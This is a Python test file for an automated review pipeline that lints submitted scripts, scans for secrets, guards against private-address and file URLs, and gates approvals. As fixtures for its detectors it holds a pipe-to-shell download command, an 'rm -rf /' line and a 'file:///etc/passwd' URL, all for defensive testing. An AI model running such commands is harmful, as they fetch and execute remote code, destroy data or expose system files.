# SPDX-FileCopyrightText: 2026 Naraen Rammoorthi <naraen13@gmail.com>
# SPDX-License-Identifier: Apache-2.0
"""Automated review checks: configuration, individual checks, and queued-to-finished execution."""

import json
import uuid
from datetime import UTC, datetime
from types import SimpleNamespace
from unittest.mock import AsyncMock

import pytest
from sqlalchemy.ext.asyncio import async_sessionmaker, create_async_engine

from models import Base
from models.mcp import ListingStatus
from models.prompt import PromptListing, PromptVersion
from models.user import User, UserRole
from services.review import check_config, ci
from services.review.decisions import gate, open_or_push
from services.review.policy import ApprovalPolicy


def ctx(subject_type, **fields):
    return ci.Ctx(subject_type, SimpleNamespace(), SimpleNamespace(**fields), None)


# ── configuration ──


def test_config_defaults_and_validation():
    effective = check_config.resolve({})
    assert effective["script_lint"] == {"enabled": True, "required": False}
    assert effective["remote_mcp"]["enabled"] is False and effective["dependency_audit"]["enabled"] is False
    assert "secrets" not in effective  # Built-in checks are not configurable.
    ok = check_config.parse_config({"checks": {"git_source": {"enabled": True, "required": True}}})
    assert ok["git_source"]["required"] is True
    for bad in (
        {"checks": {"nope": {"enabled": True}}},
        {"checks": {"secrets": {"enabled": False}}},
        {"checks": {"git_source": {"enabled": False, "required": True}}},
        {"checks": {"git_source": {"enabled": "yes"}}},
        {"checks": {"git_source": {"surprise": True}}},
        {"extra": 1},
    ):
        with pytest.raises(ValueError):
            check_config.parse_config(bad)


@pytest.mark.asyncio
async def test_team_items_use_team_settings_and_public_items_use_the_organization():
    org = {"checks": {"script_lint": {"enabled": False, "required": False}}}
    team = {"checks": {"prompt_template": {"enabled": True, "required": True}}}
    private = await check_config.effective(uuid.uuid4(), is_private=True, org_raw=org, team_raw=team)
    public = await check_config.effective(uuid.uuid4(), is_private=False, org_raw=org, team_raw=team)
    assert private["prompt_template"]["required"] and private["script_lint"]["enabled"]
    assert not public["prompt_template"]["required"] and not public["script_lint"]["enabled"]


def test_only_applicable_enabled_checks_are_queued():
    config = check_config.resolve({"script_lint": {"enabled": False, "required": False}})
    ids = {e["id"] for e in ci.queued_entries("hook", config)}
    assert "script_lint" not in ids and "secrets_entropy" in ids and "prompt_template" not in ids
    assert all(e["status"] == "queued" and e["kind"] == "automated" for e in ci.queued_entries("hook", config))


# ── individual checks ──


@pytest.mark.asyncio
async def test_script_lint_flags_syntax_errors_and_risky_patterns_without_running_anything():
    bad = await ci.check_script_lint(
        ctx("hook", script_content="if then fi (", script_filename="x.sh", handler_config={})
    )
    assert bad.status == "fail"
    risky = await ci.check_script_lint(
        ctx(
            "hook",
            script_content="curl https://x.test/i.sh | sh\nrm -rf /\n",
            script_filename="x.sh",
            handler_config={},
        )
    )
    assert risky.status == "warn" and len(risky.details) == 2
    ok = await ci.check_script_lint(ctx("hook", script_content="echo hi\n", script_filename="x.sh", handler_config={}))
    assert ok.status == "pass"
    py = await ci.check_script_lint(ctx("hook", script_content="def f(:\n", script_filename="x.py", handler_config={}))
    assert py.status == "fail"
    nothing = await ci.check_script_lint(ctx("hook", script_content=None, handler_config=None))
    assert nothing.status == "skipped"


@pytest.mark.asyncio
async def test_script_lint_covers_skill_resource_files():
    version = dict(
        script_content=None,
        handler_config=None,
        extra_files=[{"path": "cfg.json", "content": "{not json", "encoding": "utf-8"}],
    )
    assert (await ci.check_script_lint(ctx("skill", **version))).status == "fail"


@pytest.mark.asyncio
async def test_prompt_template_variables():
    version = dict(template="Hi {{name}} {{ghost}}", variables=[{"name": "name"}, {"name": "unused"}])
    out = await ci.check_prompt_template(ctx("prompt", **version))
    assert out.status == "warn" and any("ghost" in d for d in out.details) and any("unused" in d for d in out.details)
    assert (
        await ci.check_prompt_template(ctx("prompt", template="Hi {{n}}", variables=[{"name": "n"}]))
    ).status == "pass"
    assert (await ci.check_prompt_template(ctx("prompt", template="  ", variables=[]))).status == "fail"


@pytest.mark.asyncio
async def test_entropy_heuristic_ignores_placeholders_and_never_prints_the_value():
    secret = "q8Zr2LxV9bTn4KpW7cYd3FhJ"
    version_cls = PromptVersion
    version = SimpleNamespace(
        __table__=version_cls.__table__,
        **{c.name: None for c in version_cls.__table__.columns},
    )
    version.template = f"api_key = '{secret}'"
    flagged = await ci.check_secrets_entropy(ci.Ctx("prompt", None, version, None))
    assert flagged.status == "warn" and secret not in json.dumps(flagged.details)
    version.template = "api_key = '${API_KEY_FROM_ENV_PLACEHOLDER}' and token = 'your-token-goes-here-xxxx'"
    assert (await ci.check_secrets_entropy(ci.Ctx("prompt", None, version, None))).status == "pass"


@pytest.mark.asyncio
async def test_image_reference_parsing_and_pin_check():
    assert ci._split_image("python:3.12") == ("docker.io", "library/python", "3.12", None)
    assert ci._split_image("ghcr.io/o/r@sha256:" + "a" * 64)[:2] == ("ghcr.io", "o/r")
    assert ci._split_image("localhost:5000/x/y:1")[:3] == ("localhost:5000", "x/y", "1")
    assert (await ci.check_sandbox_image_pin(ctx("sandbox", image="python"))).status == "warn"
    assert (await ci.check_sandbox_image_pin(ctx("sandbox", image="python@sha256:" + "b" * 64))).status == "pass"


@pytest.mark.asyncio
async def test_private_addresses_are_never_contacted():
    with pytest.raises(ci.CheckSkippedError):
        await ci._public_request("GET", "http://127.0.0.1:9/x")
    with pytest.raises(ci.CheckSkippedError):
        await ci._public_request("GET", "http://user:pw@example.com/")
    with pytest.raises(ci.CheckSkippedError):
        ci._validate_git_url("https://token@github.com/o/r.git")
    with pytest.raises(ci.CheckSkippedError):
        ci._validate_git_url("file:///etc/passwd")


@pytest.mark.asyncio
async def test_remote_mcp_skips_stdio_servers():
    assert (await ci.check_remote_mcp(ctx("mcp", url=None, transport="stdio"))).status == "skipped"


@pytest.mark.asyncio
async def test_git_source_check_accepts_repo_root_skill_and_rejects_traversal(tmp_path):
    (tmp_path / "SKILL.md").write_text("# Skill\n")
    version = dict(
        git_url="https://github.com/example/skill.git",
        git_ref="a" * 40,
        delivery_mode="git_fetch",
        skill_md_content="# Skill",
    )
    source = ctx("skill", **version, skill_path="/")
    source.repo = AsyncMock(return_value=tmp_path)
    assert (await ci.check_git_source(source)).status == "warn"
    source.version.skill_path = "../outside"
    assert (await ci.check_git_source(source)).status == "fail"


def test_lockfile_parsing(tmp_path):
    (tmp_path / "package-lock.json").write_text(
        json.dumps({"packages": {"": {}, "node_modules/left-pad": {"version": "1.3.0"}}})
    )
    (tmp_path / "requirements.txt").write_text("requests==2.31.0\n# c\nflask[async]==3.0.0\nloose>=1\n")
    (tmp_path / "uv.lock").write_text('[[package]]\nname = "httpx"\nversion = "0.27.0"\n')
    assert ci._read_lockfiles(tmp_path) == [
        ("PyPI", "flask", "3.0.0"),
        ("PyPI", "httpx", "0.27.0"),
        ("PyPI", "requests", "2.31.0"),
        ("npm", "left-pad", "1.3.0"),
    ]


def test_rpc_payload_reads_json_and_event_streams():
    assert ci._rpc_payload(b'{"result": 1}', "application/json") == {"result": 1}
    assert ci._rpc_payload(b'event: message\ndata: {"result": 2}\n\n', "text/event-stream") == {"result": 2}


# ── queued to finished, and the gate ──


async def enabled():
    return True


@pytest.fixture
async def world(monkeypatch):
    engine = create_async_engine("sqlite+aiosqlite:///:memory:")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    factory = async_sessionmaker(engine, expire_on_commit=False)
    monkeypatch.setattr(ci, "_session", factory)
    monkeypatch.setattr(check_config, "enabled", enabled)
    async with factory() as db:
        yield db, factory
    await engine.dispose()


async def make_prompt_review(db, config, monkeypatch):
    author = User(id=uuid.uuid4(), username="a", email="a@x.test", name="A", role=UserRole.user)
    reviewer = User(id=uuid.uuid4(), username="r", email="r@x.test", name="R", role=UserRole.reviewer)
    listing = PromptListing(name="p", namespace="t", slug="p", owner="a", submitted_by=author.id)
    db.add_all([author, reviewer, listing])
    await db.flush()
    version = PromptVersion(
        listing_id=listing.id,
        version="1.0.0",
        description="d",
        template="Hi {{name}}",
        variables=[{"name": "name"}],
        category="general",
        released_by=author.id,
        released_at=datetime.now(UTC),
        status=ListingStatus.pending,
    )
    db.add(version)
    await db.flush()
    monkeypatch.setattr(ci.check_config, "effective", AsyncMock(return_value=check_config.resolve(config)))
    review = await open_or_push(db, "prompt", listing, version, author.id)
    await db.commit()
    return review, reviewer


@pytest.mark.asyncio
async def test_required_automated_check_blocks_until_the_worker_finishes_it(world, monkeypatch):
    db, factory = world
    review, _ = await make_prompt_review(db, {"prompt_template": {"enabled": True, "required": True}}, monkeypatch)
    revision = await db.get(
        type(await db.get(__import__("models").ReviewRevision, review.head_revision_id)), review.head_revision_id
    )
    queued = {c["id"]: c["status"] for c in revision.checks if c.get("kind") == "automated"}
    assert queued["prompt_template"] == "queued" and revision.checks_pending
    policy = ApprovalPolicy(required_approvals=dict.fromkeys(ApprovalPolicy().required_approvals, 0))
    assert "required_checks" in (await gate(db, review, policy=policy)).requirements

    assert await ci.run_pending() == 1
    await db.refresh(revision)
    done = {c["id"]: c for c in revision.checks if c.get("kind") == "automated"}
    assert done["prompt_template"]["status"] == "pass" and "finished_at" in done["prompt_template"]
    assert done["secrets_entropy"]["status"] == "pass" and not revision.checks_pending
    assert (await gate(db, review, policy=policy)).requirements == ()
    assert await ci.run_pending() == 0  # Nothing left to claim.


@pytest.mark.asyncio
async def test_a_failed_required_check_keeps_blocking_and_rerun_requeues_it(world, monkeypatch):
    db, factory = world
    review, reviewer = await make_prompt_review(
        db, {"prompt_template": {"enabled": True, "required": True}}, monkeypatch
    )
    version = await db.get(PromptVersion, review.version_id)
    version.template = "   "  # An empty template fails the check; keep the snapshot in step with the draft.
    revision = await db.get(__import__("models").ReviewRevision, review.head_revision_id)
    revision.content_hash = "stale"
    await db.commit()
    await ci.run_pending()
    await db.refresh(revision)
    status = {c["id"]: c for c in revision.checks if c.get("kind") == "automated"}["prompt_template"]
    assert status["status"] == "error" and "content changed" in status["details"][0].lower()
    monkeypatch.setattr(ci.check_config, "effective", AsyncMock(return_value=check_config.resolve({})))
    assert await ci.requeue(db, review, reviewer.id) >= 1
    assert revision.checks_pending and all(
        c["status"] == "queued" for c in revision.checks if c.get("kind") == "automated"
    )


@pytest.mark.asyncio
async def test_abandoned_running_checks_expire(world, monkeypatch):
    db, factory = world
    review, _ = await make_prompt_review(db, {}, monkeypatch)
    revision = await db.get(__import__("models").ReviewRevision, review.head_revision_id)
    revision.checks = [
        {"id": "git_source", "name": "g", "status": "running", "required": True, "details": [], "kind": "automated",
         "started_at": "2000-01-01T00:00:00+00:00"}
    ]  # fmt: skip
    revision.checks_pending = True
    await db.commit()
    await ci.run_pending()
    await db.refresh(revision)
    assert revision.checks[0]["status"] == "error" and not revision.checks_pending


@pytest.mark.asyncio
async def test_system_changes_after_submission_become_a_new_revision(world, monkeypatch):
    from models import ReviewRevision
    from services.review.cutover import resubmit_if_changed

    db, _ = world
    review, _ = await make_prompt_review(db, {}, monkeypatch)
    version = await db.get(PromptVersion, review.version_id)
    listing = await db.get(PromptListing, version.listing_id)
    assert await resubmit_if_changed(db, "prompt", listing, version, "system") is None  # Nothing changed.
    version.description = "filled in by a background job"
    monkeypatch.setattr(ci.check_config, "effective", AsyncMock(return_value=check_config.resolve({})))
    assert await resubmit_if_changed(db, "prompt", listing, version, "system") is not None
    head = await db.get(ReviewRevision, review.head_revision_id)
    assert head.number == 2 and head.message == "system"


@pytest.mark.asyncio
async def test_automated_checks_do_nothing_and_never_block_while_experiment_is_off(world, monkeypatch):
    db, _ = world
    review, _ = await make_prompt_review(db, {"prompt_template": {"enabled": True, "required": True}}, monkeypatch)
    revision = await db.get(__import__("models").ReviewRevision, review.head_revision_id)
    assert revision.checks_pending
    monkeypatch.setattr(check_config, "enabled", AsyncMock(return_value=False))
    assert await ci.run_pending() == 0  # the worker leaves them alone
    assert ci.visible(revision.checks, False) == [c for c in revision.checks if c.get("kind") != "automated"]
    policy = ApprovalPolicy(required_approvals=dict.fromkeys(ApprovalPolicy().required_approvals, 0))
    assert "required_checks" not in (await gate(db, review, policy=policy)).requirements


@pytest.mark.asyncio
async def test_built_in_check_failure_blocks_and_is_reported_while_experiment_is_off(world, monkeypatch):
    db, _ = world
    review, _ = await make_prompt_review(db, {}, monkeypatch)
    revision = await db.get(__import__("models").ReviewRevision, review.head_revision_id)
    revision.checks = [
        {"id": "secrets", "name": "Secret scan", "status": "pass", "required": True, "details": []},
        {"id": "schema", "name": "Required fields", "status": "fail", "required": True, "details": ["description"]},
    ]
    await db.commit()
    monkeypatch.setattr(check_config, "enabled", AsyncMock(return_value=False))
    policy = ApprovalPolicy(required_approvals=dict.fromkeys(ApprovalPolicy().required_approvals, 0))
    result = await gate(db, review, policy=policy)
    assert result.requirements == ("required_checks",)
    assert result.blocking_checks == (
        {"id": "schema", "name": "Required fields", "status": "fail", "details": ["description"]},
    )


@pytest.mark.asyncio
async def test_draft_save_pushes_a_revision_reviewers_can_see(world, monkeypatch):
    from models import ReviewRevision
    from services.review.cutover import DRAFT_EDIT_MESSAGE, push_draft_edit, submit_for_review

    db, _ = world
    review, _ = await make_prompt_review(db, {}, monkeypatch)
    version = await db.get(PromptVersion, review.version_id)
    listing = await db.get(PromptListing, version.listing_id)
    monkeypatch.setattr(ci.check_config, "effective", AsyncMock(return_value=check_config.resolve({})))
    assert await push_draft_edit(db, "prompt", listing, version, version.released_by) is None  # Unchanged.
    version.description = "A full sentence written after submission."
    pushed = await push_draft_edit(db, "prompt", listing, version, version.released_by)
    assert pushed == {"review_number": review.number, "review_url": f"/review/{review.number}", "review_revision": 2}
    head = await db.get(ReviewRevision, review.head_revision_id)
    assert head.number == 2 and head.message == DRAFT_EDIT_MESSAGE
    policy = ApprovalPolicy(required_approvals=dict.fromkeys(ApprovalPolicy().required_approvals, 0))
    assert "unsubmitted_changes" not in (await gate(db, review, policy=policy)).requirements
    # Submitting what reviewers already see is accepted and keeps the same head revision.
    await submit_for_review(db, "prompt", listing, version, version.released_by, message="Clarified description")
    head = await db.get(ReviewRevision, review.head_revision_id)
    assert head.number == 2 and head.message == "Clarified description"
    # Submitting again with nothing new says the version is already under review.
    from fastapi import HTTPException

    with pytest.raises(HTTPException) as unchanged:
        await submit_for_review(db, "prompt", listing, version, version.released_by)
    assert unchanged.value.status_code == 409 and f"Already under review as #{review.number}" in unchanged.value.detail


@pytest.mark.asyncio
async def test_draft_save_without_an_open_review_pushes_nothing(world, monkeypatch):
    from services.review.cutover import push_draft_edit

    db, _ = world
    review, reviewer = await make_prompt_review(db, {}, monkeypatch)
    version = await db.get(PromptVersion, review.version_id)
    listing = await db.get(PromptListing, version.listing_id)
    from models.review import ReviewState

    review.state = ReviewState.closed
    version.description = "edited after withdrawal"
    assert await push_draft_edit(db, "prompt", listing, version, version.released_by) is None
